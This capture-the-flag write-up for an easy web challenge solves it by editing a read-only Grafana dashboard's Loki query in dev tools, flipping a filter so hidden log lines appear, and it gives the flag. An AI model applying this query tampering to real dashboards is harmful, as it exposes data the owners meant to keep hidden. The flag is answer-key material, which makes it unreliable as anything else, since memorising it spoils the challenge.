# [Black Box]

## Category
Web

## Estimated difficulty
Easy

## Description

Request Injection in read only grafana dashboard

## Scenario

One of our planes was making strange web requests before it went down. We have recovered its black box, but we lost the credentials. 
Can you figure out what happened?

## Write-up

When you are in a dashboard, open dev tools and find the "query". you will find:
```{"queries":[{"datasource":{"type":"loki","uid":"P8E80F9AEF21F6940"},"editorMode":"code","expr":"{filename=\"/etc/promtail/logs.txt\"} !~ \"flag\"","queryType":"range","refId":"A","maxLines":1000,"legendFormat":"","datasourceId":1,"intervalMs":300000,"maxDataPoints":1191}],"range":{"from":"2023-03-20T23:00:00.000Z","to":"2023-03-23T22:59:59.000Z","raw":{"from":"2023-03-20T23:00:00.000Z","to":"2023-03-23T22:59:59.000Z"}},"from":"1679353200000","to":"1679612399000"}```

You just need to modify the query with 

```{filename=\"/etc/promtail/logs.txt\"} =~ \"flag\"```

## Flag

csc{c4re_ab0ut_gr4phana_s0urc3s}

## Creator
Arno Alexandre

## Creator bio

Just a cybersecurity enthusiast like you
